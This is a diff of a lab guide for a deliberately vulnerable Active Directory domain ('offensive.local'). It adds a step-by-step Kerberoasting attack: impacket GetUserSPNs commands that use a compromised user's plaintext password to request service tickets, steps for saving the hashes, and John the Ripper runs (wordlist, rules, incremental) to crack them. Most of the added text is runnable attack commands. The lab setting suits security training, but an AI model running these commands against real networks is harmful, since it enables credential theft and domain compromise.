@@ -47,13 +47,40 @@ setspn -s HTTP/DomainC.offensive.local svcWeb
 # MSSQL service on the DC
 setspn -s MSSQLSvc/DomainC.offensive.local:1433 svcSQL
 
-  
-# Attack prerequisite: A user account with their credentials is needed for the attack. For now, assumed breach.
+
+# Attack steps:
+
+# Step 0. Attack prerequisite: A user account with their credentials is needed for the attack. We use the franky.lanie account for which we obtained the password after the LLMNR attack.
 
 #Step 1: Find if any SNPs are available. Install impacket: sudo apt install python3-impacket
-# Navigate to the python3-impacket/examples folder on your machine. Usually in /usr/share/doc/python3-impacket/examples. Run the following:
 
-python3 GetUserSPNs.py\
-  offensive.local/franky.lanie:Password123  \ 
- -dc-ip 192.168.56.2
+# Navigate to the python3-impacket/examples folder on your machine. Usually in /usr/share/doc/python3-impacket/examples. Run the following:
+python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.56.2
+
+# Step 2: Make the ticket requests (TGS and TGT).
+
+# Now with the -request flag
+python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.56.2 -request
+
+# Step 3: Save the extracted hashes, each in their own txt file. cd to a location where you can create files. For us we saved them in Documents.
+
+# extract the easy hash  (corresponding to account with weak password) to a txt file
+echo 'manually copy eash hash value here' > easy_hash.txt
+
+# extract the hard hash  (corresponding to account with strong password) to a txt file
+echo 'manually copy hard hash value here' > hard_hash.txt
+
+# Step 4: use John the Ripper to crack the passwords. To get the tool: sudo apt install john
+
+# wordlist attack using rockyou.txt on the easy hash
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt easy_hash.txt 
+
+# wordlist attack using rockyou.txt on the hard hash
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hard_hash.txt 
+
+# wordlist attack using rockyou.txt on the hard hash using rules now
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt --rules hard_hash.txt
+
+# brute forcing password
+john --format=krb5tgs --incremental hard_hash.txt
 
